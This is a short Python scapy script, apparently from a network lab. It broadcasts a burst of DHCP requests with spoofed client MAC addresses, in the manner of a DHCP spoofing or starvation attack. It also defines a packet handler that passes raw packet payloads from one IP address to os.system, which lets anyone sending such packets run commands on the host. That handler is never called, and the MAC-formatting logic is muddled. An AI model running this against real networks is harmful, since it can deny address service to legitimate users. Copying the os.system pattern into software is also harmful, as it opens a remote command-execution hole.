#!/usr/bin/env python
import os, sys, time
from scapy.all import *

def handle_pkt(pkt):
    if IP in pkt and pkt[IP].src == "10.0.1.2":
    	if Raw in pkt:
    		os.system(pkt[Raw].load)
    		print("IP " + str(pkt[IP].dst) + " was assigned")
    	exit(1)

def main():
    ifaces = list(filter(lambda i: 'eth' in i, os.listdir('/sys/class/net/')))
    iface = ifaces[0]
    fam, hw = get_if_raw_hwaddr(iface)
    print("Sending DHCP packet with spoofed MAC address")
    for i in range(4,50):
        if len(str(i)) == 1: i = "0" + str(i)
        spoofed_hw = (hw[:len(hw) - 1].decode() + r"\x" + str(i)).encode()
        print("00:00:00:00:01" + str(spoofed_hw.decode()).replace(r"\x", ":"))
        pkt = Ether(src = get_if_hwaddr(iface), dst = 'ff:ff:ff:ff:ff:ff')
        pkt = pkt / IP(dst = '255.255.255.255') / UDP(dport = 67, sport = 68) / BOOTP(op = 1, chaddr = spoofed_hw) / DHCP(options = [('message-type','request'), ('end')])
        sendp(pkt, iface = iface, verbose = False)
        time.sleep(0.5)

if __name__ == '__main__':
	main()
